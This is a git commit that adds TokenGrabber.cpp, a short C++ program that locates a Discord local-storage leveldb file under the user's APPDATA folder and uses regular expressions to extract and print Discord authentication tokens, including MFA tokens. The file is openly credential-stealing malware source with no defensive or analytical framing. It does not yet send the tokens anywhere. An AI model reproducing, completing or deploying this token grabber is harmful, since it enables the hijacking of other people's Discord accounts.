e1281882e5f2e55732e16c83ffee8a3c2e36bc7e
xanthe1337 <53409082+xanthe1337@users.noreply.github.com>
2020-03-22 21:21:28 +0100

    Create TokenGrabber.cpp

---
+++ TokenGraber/TokenGrabber.cpp
@@ -0,0 +1,45 @@
+#include <iostream>
+#include <fstream>
+#include <string>
+#include <regex>
+#include <streambuf>
+    
+using namespace std;
+    size_t sz = 0;
+    char* szBuf;
+    errno_t environment = _dupenv_s(&szBuf, &sz, "APPDATA");
+    string AppData = szBuf;
+    string leveldb = AppData + "/Discord/Local Storage/leveldb/002487.ldb";
+    string token = "oken";
+    string line;
+
+int main()
+{
+    smatch smatch;
+    try {
+        ifstream file(leveldb);
+        if (file.is_open()) {
+            while (getline(file, line)) {
+                cout << line << '\n';
+                if (line.find(token)) {
+                    regex x(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})");
+                    if (regex_search(line, smatch, x) == true) {
+                        cout << smatch.str() << '\n';
+                    } else {
+                        regex y(R"(mfa\.[\w-]{84})");
+                        if (regex_search(line, smatch, y) == true) {
+                            cout << smatch.str() << '\n';
+                        } else {
+                            cout << "Not Found" << '\n';
+                        }
+                    }
+                }
+            } file.close();
+        }
+        else {
+            return 0;
+        }
+    } catch (exception) {
+        return 0;
+    }
+}
